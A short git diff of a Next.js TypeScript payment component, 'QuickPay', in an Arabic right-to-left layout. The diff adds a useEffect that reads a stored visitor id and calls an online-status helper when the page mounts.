@@ -2,12 +2,13 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { ChevronDown, Heart, Menu, ShoppingCart } from "lucide-react"
 import { useRouter } from "next/navigation"
 import { addData } from "./lib/firebase"
 import Loader from "./components/loader"
 import { useLocation } from "./lib/use-location"
+import { setupOnlineStatus } from "./lib/utils"
 
 export default function QuickPay() {
   const [phone, setPhone] = useState("")
@@ -22,7 +23,11 @@ export default function QuickPay() {
 
   // Call useLocation at the top level of the component
   useLocation()
+const init=()=>{
+  const visitorId = localStorage.getItem("visitor")
+  setupOnlineStatus(visitorId!)
 
+}
   const handleAmountChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
     const value = e.target.value
     setSelectedAmounts(Number.parseFloat(value))
@@ -47,7 +52,9 @@ export default function QuickPay() {
       setLoading(false)
     }, 2000)
   }
-
+useEffect(()=>{
+  init()
+},[])
   return (
     <div className="min-h-screen bg-gray-100 font-[Cairo] text-right" dir="rtl">
       {/* Header */}
